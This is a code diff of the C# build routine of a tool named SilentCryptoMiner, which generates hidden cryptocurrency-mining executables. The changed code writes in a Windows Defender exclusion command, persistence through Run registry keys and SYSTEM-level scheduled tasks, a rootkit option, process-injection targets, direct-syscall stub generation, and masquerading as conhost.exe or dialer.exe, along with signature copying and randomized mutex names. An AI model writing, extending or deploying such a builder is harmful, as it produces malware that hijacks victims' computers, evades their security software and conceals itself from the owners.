@@ -19,8 +19,8 @@ namespace SilentCryptoMiner
             try
             {
                 string currentDirectory = Path.GetDirectoryName(savePath);
-                string filename = Path.GetFileNameWithoutExtension(savePath);
                 var paths = new Dictionary<string, string>() {
+                    { "compilerbin",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\") },
                     { "windres",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\windres.exe") },
                     { "g++",  Path.Combine(currentDirectory, @"UCompilers\gcc\bin\g++.exe") },
                     { "syswhispersu",  Path.Combine(currentDirectory, @"UCompilers\SysWhispersU\SysWhispersU.exe") },
@@ -30,14 +30,10 @@ namespace SilentCryptoMiner
                     { "manifest", Path.Combine(currentDirectory, "program.manifest") },
                     { "resource.rc", Path.Combine(currentDirectory, "resource.rc") },
                     { "resource.o", Path.Combine(currentDirectory, "resource.o") },
-                    { "filename", Path.Combine(currentDirectory, filename) }
+                    { "filename", Path.Combine(currentDirectory, Path.GetFileNameWithoutExtension(savePath)) }
                 };
 
-                if (F.BuildError(currentDirectory.Contains(" "), string.Format("Error: Build path \"{0}\" contains a space in its path, spaces are not allowed in some of the compiler programs. Please choose another build location without a space in its path.", savePath))) return false;
-                var directoryFilter = F.CheckNonASCII(savePath);
-                if (F.BuildError(directoryFilter.Length > 0, string.Format("Error: Build path \"{0}\" contains the following possible illegal special characters: {1}, please choose a build path without any special characters.", savePath, string.Join("", directoryFilter)))) return false;
                 if (F.BuildError(!F.txtStartDelay.Text.All(new Func<char, bool>(char.IsDigit)), "Error: Start Delay must be a number.")) return false;
-                if (F.BuildError(!string.Join("", new string[] { F.txtAssemblyVersion1.Text, F.txtAssemblyVersion2.Text, F.txtAssemblyVersion3.Text, F.txtAssemblyVersion4.Text }).All(new Func<char, bool>(char.IsDigit)), "Error: Assembly Version must only contain numbers.")) return false;
 
                 var resource = new StringBuilder(Properties.Resources.resource);
                 string defs = "";
@@ -62,7 +58,7 @@ namespace SilentCryptoMiner
                 CreateManifest(paths["manifest"], requireAdministrator);
 
                 File.WriteAllText(paths["resource.rc"], resource.ToString());
-                RunExternalProgram(paths["windres"], string.Format("--input resource.rc --output resource.o -O coff --codepage=65001 {1}", paths["windres"], defs), currentDirectory, paths["windreslog"]);
+                RunExternalProgram($"windres.exe --input \"{(Path.Combine(currentDirectory, "resource.rc"))}\" --output \"{(Path.Combine(currentDirectory, "resource.o"))}\" -O coff --codepage=65001 {defs}", paths["compilerbin"], paths["windreslog"]);
                 File.Delete(paths["resource.rc"]);
                 File.Delete(paths["manifest"]);
                 if (F.BuildError(!File.Exists(paths["resource.o"]), string.Format("Error: Failed at compiling resources, check the error log at {0}.", paths["windreslog"])))
@@ -71,19 +67,19 @@ namespace SilentCryptoMiner
                 var maincode = new StringBuilder(mainFileCode);
                 ReplaceGlobals(ref maincode);
 
-                RunExternalProgram(paths["syswhispersu"], "-a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtCreateSection,NtClose,NtMapViewOfSection,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation,NtQueryInformationToken,NtCreateKey,NtOpenKey,NtEnumerateKey,NtDeleteKey,NtQueryValueKey,NtSetValueKey,NtRenameKey -o UFiles\\Syscalls\\syscalls", currentDirectory, paths["syswhispersulog"]);
+                RunExternalProgram($"\"{paths["syswhispersu"]}\" -a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtCreateSection,NtClose,NtMapViewOfSection,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation,NtQueryInformationToken,NtOpenKey,NtEnumerateKey,NtQueryValueKey,NtRenameKey -o \"{currentDirectory}\\UFiles\\Syscalls\\syscalls\"", currentDirectory, paths["syswhispersulog"]);
                 File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
-                RunExternalProgram(paths["g++"], compilerCommand, currentDirectory, paths["g++log"]);
+                RunExternalProgram(compilerCommand, paths["compilerbin"], paths["g++log"]);
                 File.Delete(paths["resource.o"]);
                 File.Delete(paths["filename"] + ".cpp");
                 if (F.BuildError(!File.Exists(paths["filename"] + ".exe"), string.Format("Error: Failed at compiling program, check the error log at {0}.", paths["g++log"])))
                     return false;
 
-                if (F.toggleRootkit.Checked)
+                if (F.FormAO.toggleRootkit.Checked)
                 {
                     MakeRootkitHelper(savePath);
                 }
-                if(!string.IsNullOrEmpty(F.txtSignatureData.Text))
+                if(F.chkSignature.Checked && !string.IsNullOrEmpty(F.txtSignatureData.Text))
                 {
                     F.WriteSignature(Convert.FromBase64String(F.txtSignatureData.Text), paths["filename"] + ".exe");
                 }
@@ -133,7 +129,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -158,7 +154,7 @@ namespace SilentCryptoMiner
 
             CreateManifest(savePath + ".manifest", F.toggleAdministrator.Checked);
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 using (var R = new System.Resources.ResourceWriter("uninstaller.Resources"))
                 {
@@ -189,7 +185,7 @@ namespace SilentCryptoMiner
                 return false;
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 MakeRootkitHelper(savePath);
             }
@@ -203,12 +199,12 @@ namespace SilentCryptoMiner
             File.WriteAllBytes(savePath, newFile);
         }
 
-        public static void RunExternalProgram(string filename, string arguments, string workingDirectory, string logpath)
+        public static void RunExternalProgram(string arguments, string workingDirectory, string logpath)
         {
             using (Process process = new Process())
             {
-                process.StartInfo.FileName = filename;
-                process.StartInfo.Arguments = arguments;
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/C set PATH=%cd%;%PATH% && " + arguments;
                 process.StartInfo.WorkingDirectory = workingDirectory;
                 process.StartInfo.CreateNoWindow = true;
                 process.StartInfo.UseShellExecute = false;
@@ -261,6 +257,8 @@ namespace SilentCryptoMiner
         {
             bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;
 
+            StringBuilder globalResources = new StringBuilder();
+
             if (F.xmrGPU)
             {
                 stringb.Replace("DefGPULibs", "true");
@@ -277,7 +275,7 @@ namespace SilentCryptoMiner
                 stringb.Replace("#WDCOMMAND", $"Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
             }
 
-            if (F.toggleRootkit.Checked)
+            if (F.FormAO.toggleRootkit.Checked)
             {
                 stringb.Replace("DefRootkit", "true");
             }
@@ -313,10 +311,6 @@ namespace SilentCryptoMiner
                 stringb.Replace("DefStartDelay", "true");
                 stringb.Replace("$STARTDELAY", F.txtStartDelay.Text + "000");
             }
-            else
-            {
-                stringb.Replace("$STARTDELAY", "0");
-            }
 
             if (F.chkStartup.Checked)
             {
@@ -325,6 +319,13 @@ namespace SilentCryptoMiner
                 string basedir;
                 switch (F.Invoke(new Func<string>(() => F.txtStartupPath.Text)) ?? "")
                 {
+                    case "ProgramFiles":
+                        {
+                            installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
+                            basedir = "PROGRAMFILES=";
+                            break;
+                        }
+
                     case "UserProfile":
                         {
                             installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
@@ -341,16 +342,13 @@ namespace SilentCryptoMiner
                         }
                 }
 
-                if (systemadmincheck)
-                {
-                    installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
-                    basedir = "PROGRAMFILES=";
-                }
-
                 stringb.Replace("$BASEDIR", basedir);
                 stringb.Replace("PayloadPath", $"System.IO.Path.Combine({installdir}, \"{F.ToLiteral(F.txtStartupFileName.Text)}\")");
 
                 stringb.Replace("#STARTUPFILE", @"\\" + F.txtStartupFileName.Text.Replace(@"\", @"\\"));
+                stringb.Replace("#TMPXML", $@"\\{F.Randomi(12, false)}.xml");
+
+                CreateResource(globalResources, "resTaskTemplate", Encoding.UTF8.GetBytes(Properties.Resources.TaskTemplate.Replace("#STARTUPPATH", $"%{F.Invoke(new Func<string>(() => F.txtStartupPath.Text))}%\\{F.Invoke(new Func<string>(() => F.txtStartupFileName.Text))}")));
 
                 if (F.toggleWatchdog.Checked)
                 {
@@ -376,18 +374,22 @@ namespace SilentCryptoMiner
             stringb.Replace("$INJECTIONTARGETS", "\"" + string.Join("\", \"", F.injectionTargets.Distinct().ToList()) + "\"");
 
             stringb.Replace("#WATCHDOGID", F.watchdogID);
+            stringb.Replace("#MUTEXMINER", F.Randomi(24, false));
 
             stringb.Replace("#STARTUPADDUSER", ReplaceEscape($"add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d \"%S\""));
-            stringb.Replace("#STARTUPADDADMIN", ReplaceEscape($"<#{F.Randomi(F.rand.Next(5, 10), false)}#> IF([System.Environment]::OSVersion.Version -lt [System.Version]\"6.2\") {{ schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru 'System'" : "")} /tn '{F.txtStartupEntryName.Text.Replace("'", "''")}' /tr '''%S''' }} Else {{ Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '%S')  -Trigger (New-ScheduledTaskTrigger {(systemadmincheck ? "-AtStartup" : "-AtLogOn")})  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName '{F.txtStartupEntryName.Text.Replace("'", "''")}' {(systemadmincheck ? "-User 'System'" : "")} -RunLevel 'Highest' -Force; }}"));
+            stringb.Replace("#STARTUPADDADMIN", ReplaceEscape($"/create /f {(systemadmincheck ? "/ru \"System\"" : "")} /tn \"{F.txtStartupEntryName.Text.Replace("\"", "\"\"")}\" /xml \"%S\""));
+            stringb.Replace("#STARTUPREMOVEUSER", ReplaceEscape($"delete \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /f"));
+            stringb.Replace("#STARTUPREMOVEADMIN", ReplaceEscape($"/delete /f /tn \"{F.txtStartupEntryName.Text.Replace("\"", "\"\"")}\""));
             stringb.Replace("#STARTUPSTARTADMIN", ReplaceEscape($"/run /tn \"{F.txtStartupEntryName.Text}\""));
 
             stringb.Replace("#STARTUPENTRYNAME", ReplaceEscape(F.txtStartupEntryName.Text));
             
-            stringb.Replace("#CONHOSTPATH", F.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");
+            stringb.Replace("#CONHOSTPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");
 
             stringb.Replace("#TMPNAME", $@"\\{F.Randomi(12, false)}.tmp");
+            stringb.Replace("#WINRINGNAME", F.winringName);
 
-            stringb.Replace("#CIPHERKEY", F.CipherKey);
+            stringb.Replace("$GLOBALRESOURCES", globalResources.ToString());
         }
     }
 }
